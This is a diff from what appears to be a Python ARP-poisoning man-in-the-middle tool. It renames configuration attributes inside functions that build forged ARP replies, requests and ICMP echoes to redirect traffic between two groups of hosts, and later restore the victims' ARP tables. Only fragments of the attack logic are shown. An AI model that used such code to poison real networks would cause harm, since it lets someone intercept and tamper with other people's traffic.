@@ -42,13 +42,13 @@ def poison_loop(forged_packets, interface, iterations, stop_event):
 		# For the first 5 poison batches use the warm up delay
 		if i < 5:
 			# Check if thread should stop every 1 second
-			for j in range(config.arp_poison_warm_up):
+			for j in range(config.arp.poison_warm_up):
 				time.sleep(1)
 				if stop_event.is_set():
 					return
 		else:
 			# Check if thread should stop every 1 second
-			for j in range(config.arp_poison_delay):
+			for j in range(config.arp.poison_delay):
 				time.sleep(1)
 				if stop_event.is_set():
 					return
@@ -64,21 +64,21 @@ def start_arp_mitm(group1, group2, self_mac, interface):
 		for (ip2, mac2) in group2:
 			if (ip1, mac1) != (ip2, mac2):
 				# ICMP echo request
-				if config.arp_poison_icmp:
+				if config.arp.poison_icmp:
 					forged_packets.append(forge_icmp_echo_request(ip2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_icmp_echo_request(ip1, ip2, mac2))
 
 				# ARP reply
-				if config.arp_poison_reply:
+				if config.arp.poison_reply:
 					forged_packets.append(forge_arp_reply(ip2, self_mac, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_reply(ip1, self_mac, ip2, mac2))
 
 				# ARP request
-				if config.arp_poison_request:
+				if config.arp.poison_request:
 					forged_packets.append(forge_arp_request(ip2, self_mac, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_request(ip1, self_mac, ip2, mac2))
 
 	# event to signal that the poison_loop thread should stop
@@ -103,15 +103,15 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 		for (ip2, mac2) in group2:
 			if (ip1, mac1) != (ip2, mac2):
 				# ARP reply
-				if config.arp_poison_reply:
+				if config.arp.poison_reply:
 					forged_packets.append(forge_arp_reply(ip2, mac2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))
 
 				# ARP request
-				if config.arp_poison_request:
+				if config.arp.poison_request:
 					forged_packets.append(forge_arp_request(ip2, mac2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))
 
 	print("Re-poisoning the victims to restore the valid ARP entries...")
